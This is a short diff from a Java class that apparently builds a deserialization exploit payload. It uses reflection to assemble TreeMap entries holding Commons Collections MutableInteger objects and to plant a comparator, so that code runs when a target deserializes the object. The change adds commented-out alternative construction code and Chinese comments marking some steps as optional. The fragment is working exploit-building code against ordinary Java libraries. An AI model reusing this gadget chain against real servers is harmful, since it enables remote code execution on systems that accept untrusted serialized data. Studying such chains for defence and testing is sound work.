@@ -49,13 +49,21 @@ public class cb {
         Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
         Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
         nodeCons.setAccessible(true);
+        
         Object MutableInteger = createWithoutConstructor("org.apache.commons.collections.bag.AbstractMapBag$MutableInteger");
+        //        Class<?> mutableInteger = Class.forName("org.apache.commons.collections.bag.AbstractMapBag$MutableInteger");
+        //        Constructor<?> constructor = mutableInteger.getDeclaredConstructors()[0];
+        //        constructor.setAccessible(true);
+        //        Object MutableInteger = constructor.newInstance(1);
+
+        
         Object node = nodeCons.newInstance(obj,MutableInteger, null);
+        //可有可无
         Object right = nodeCons.newInstance(obj, MutableInteger, node);
 
       //为了保证在序列化时能够正常的遍历
         setFieldValue(m, "root", node);
-      
+      //可有可无
         setFieldValue(node, "right", right);
         
         setFieldValue(m, "comparator", comparator);
